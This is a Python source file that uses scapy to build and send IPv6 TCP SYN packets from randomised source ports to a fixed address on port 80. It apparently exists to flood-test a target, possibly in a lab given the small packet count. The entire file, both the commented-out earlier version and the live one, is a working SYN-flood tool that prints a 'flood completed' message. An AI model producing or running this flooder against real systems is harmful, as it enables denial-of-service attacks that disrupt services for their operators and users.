# import random
# import time
# from scapy.all import IPv6, TCP, send, RandIP6

# def flood_ipv6_tcp(target_ip, target_port, count, port_range=(49152, 49160), delay=0.1):
#     used_ports = set()  # 存储已使用的端口号
#     for _ in range(count):
#         while True:
#             src_port = random.randint(*port_range)
#             if src_port not in used_ports:
#                 used_ports.add(src_port)
#                 break
        
#         # 构建IPv6和TCP层
#         ipv6 = IPv6(dst=target_ip)
#         tcp = TCP(dport=target_port, sport=src_port)
#         packet = ipv6 / tcp
        
#         # 发送数据包并等待指定的时间
#         send(packet, verbose=False)
#         print(f"Sent {_+1}/{count} IPv6 TCP packet to {target_ip}:{target_port} from port {src_port}")
#         time.sleep(delay)  # 控制发送间隔

#         # 可选：定期清空已使用的端口集合，允许端口重用
#         if len(used_ports) >= (port_range[1] - port_range[0]):
#             used_ports.clear()

# if __name__ == "__main__":
#     target_ip = "2001:2:1::1"
#     target_port = 80
#     packet_count = 500
#     flood_ipv6_tcp(target_ip, target_port, packet_count)
#     print("Flooding completed.")
import random
from datetime import datetime
from scapy.all import *
def flood_ipv6_tcp(target_ip, target_port, count, port_range=(49152, 49190), delay=0.1, size_range=(50, 150)):
    used_ports = set()  # Storing used port numbers to avoid duplicates within the session
    for _ in range(count):
        while True:
            src_port = random.randint(*port_range)  # Randomly select a source port within the specified range
            if src_port not in used_ports:
                used_ports.add(src_port)
                break
        
        # Construct the IPv6 and TCP layers
        ipv6 = IPv6(dst=target_ip)
        tcp = TCP(dport=target_port, sport=src_port,flags = "S")
        packet = ipv6 / tcp  # Assemble the packet layers with payload
        
        # Send the packet and wait for the specified delay
        send(packet, verbose=False)
        print(f"Sent {_+1}/{count} IPv6 TCP packet to {target_ip}:{target_port} from port {src_port}")
        #time.sleep(delay)  # Control the rate of packet sending

        # Optionally clear the set of used ports if all possible ports have been used
        if len(used_ports) >= (port_range[1] - port_range[0]):
            used_ports.clear()

if __name__ == "__main__":
    target_ip = "2001:2:1::1"
    target_port = 80
    packet_count = 28
    #开始发包
    start_time = datetime.now()
    flood_ipv6_tcp(target_ip, target_port, packet_count)
    #结束时间
    end_time = datetime.now()
    
    formatted_time_start = start_time.strftime('%Y-%m-%d %H:%M:%S.%f')
    formatted_time_end = end_time.strftime('%Y-%m-%d %H:%M:%S.%f')
    print(f"flood completed.start_time {formatted_time_start}, end_time{formatted_time_end}")



